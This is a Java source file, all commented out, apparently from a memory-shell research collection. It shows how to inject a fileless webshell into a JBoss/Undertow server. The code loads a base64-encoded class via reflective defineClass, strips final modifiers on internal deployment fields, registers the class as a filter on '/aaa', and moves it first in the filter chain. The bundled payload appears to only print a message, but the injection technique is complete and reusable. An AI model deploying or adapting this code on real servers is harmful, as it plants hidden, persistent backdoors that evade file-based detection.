//package com.memshell.jboss;
//
//import io.undertow.servlet.api.DeploymentInfo;
//import io.undertow.servlet.api.FilterInfo;
//import io.undertow.servlet.api.FilterMappingInfo;
//import io.undertow.servlet.core.DeploymentImpl;
//import io.undertow.servlet.spec.FilterRegistrationImpl;
//import io.undertow.servlet.spec.HttpServletRequestImpl;
//import io.undertow.servlet.spec.ServletContextImpl;
//import io.undertow.servlet.spec.ServletRegistrationImpl;
//import io.undertow.servlet.util.ConstructorInstanceFactory;
//import sun.misc.BASE64Decoder;
//
//import javax.security.jacc.PolicyContext;
//import javax.servlet.DispatcherType;
//import javax.servlet.Filter;
//import javax.servlet.ServletContext;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.lang.reflect.Modifier;
//import java.util.EnumSet;
//import java.util.List;
//import java.util.Map;
//
//public class FilterBasedWithoutRequest extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        // 参考：
//        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
//        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw
//
//        try{
//            String className = "com.memshell.generic.DynamicFilterTemplate";
//            Class clazz = null;
//            try {
//                clazz = Class.forName(className);
//            } catch (ClassNotFoundException e) {
//                BASE64Decoder base64Decoder = new BASE64Decoder();
//                String codeStr = "yv66vgAAADQAMgoABgAhCQAiACMIACQKACUAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwAqAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwArAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABpEeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YQwACAAJBwAsDAAtAC4BAClJJ20gRmlsdGVyIEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcALwwAMAAxAQAqY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAAEAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAABgAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAAA1AAAAAgAAAAGxAAAAAgALAAAABgABAAAACwAMAAAAFgACAAAAAQANAA4AAAAAAAEAEQASAAEAEwAAAAQAAQAUAAEAFQAWAAIACgAAAFUAAgAEAAAACbIAAhIDtgAEsQAAAAIACwAAAAoAAgAAABUACAAWAAwAAAAqAAQAAAAJAA0ADgAAAAAACQAXABgAAQAAAAkAGQAaAAIAAAAJABsAHAADABMAAAAGAAIAHQAUAAEAHgAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAbAAwAAAAMAAEAAAABAA0ADgAAAAEAHwAAAAIAIA==";
//                Method defineClassMethod = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                defineClassMethod.setAccessible(true);
//                clazz = (Class)defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), base64Decoder.decodeBuffer(codeStr), 0, base64Decoder.decodeBuffer(codeStr).length);
//            }
//
////            public javax.servlet.FilterRegistration.Dynamic addFilter(String filterName, Filter filter) {
////                this.ensureNotProgramaticListener();
////                this.ensureNotInitialized();
////                if (this.deploymentInfo.getFilters().containsKey(filterName)) {
////                    return null;
////                } else {
////                    FilterInfo f = new FilterInfo(filterName, filter.getClass(), new ImmediateInstanceFactory(filter));
////                    this.deploymentInfo.addFilter(f);
////                    this.deployment.getFilters().addFilter(f);
////                    return new FilterRegistrationImpl(f, this.deployment, this);
////                }
////            }
//
//            FilterInfo filter = new FilterInfo("myFilter", clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
//            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
//            ServletContext context = request.getServletContext();
//            Field f = context.getClass().getDeclaredField("deploymentInfo");
//            f.setAccessible(true);
//            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);
//
//            //只添加一次
//            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
//            if(!filters.containsKey("myFilter")){
//                System.out.println("Add Dynamic Filter...");
//                deploymentInfo.addFilter(filter);
//
//                f = context.getClass().getDeclaredField("deployment");
//                f.setAccessible(true);
//                Field modifiersField = Field.class.getDeclaredField("modifiers");
//                modifiersField.setAccessible(true);
//                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
//                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
//                deployment.getFilters().addFilter(filter);
//
//                FilterRegistrationImpl registration = new FilterRegistrationImpl(filter, deployment, (ServletContextImpl)context);
//                registration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST),
//                        true, "/aaa");
////                针对特定的 Servlet
////                registration.addMappingForServletNames(EnumSet.of(DispatcherType.REQUEST), true, "test");
//
//                //将我们添加的 Filter 移动到 filterChain 的第一位
//                f = deploymentInfo.getClass().getDeclaredField("filterUrlMappings");
//                f.setAccessible(true);
//                modifiersField = Field.class.getDeclaredField("modifiers");
//                modifiersField.setAccessible(true);
//                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
//                List<FilterMappingInfo> filterUrlMappings = (List<FilterMappingInfo>) f.get(deploymentInfo);
//
//                for(int i = 0; i < filterUrlMappings.size(); i++){
//                    if(filterUrlMappings.get(i).getFilterName().equals("myFilter")){
//                        FilterMappingInfo temp = filterUrlMappings.get(i);
//                        filterUrlMappings.set(i, filterUrlMappings.get(0));
//                        filterUrlMappings.set(0, temp);
//                        break;
//                    }
//                }
//            }
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//
//        System.out.println("Done");
//    }
//}
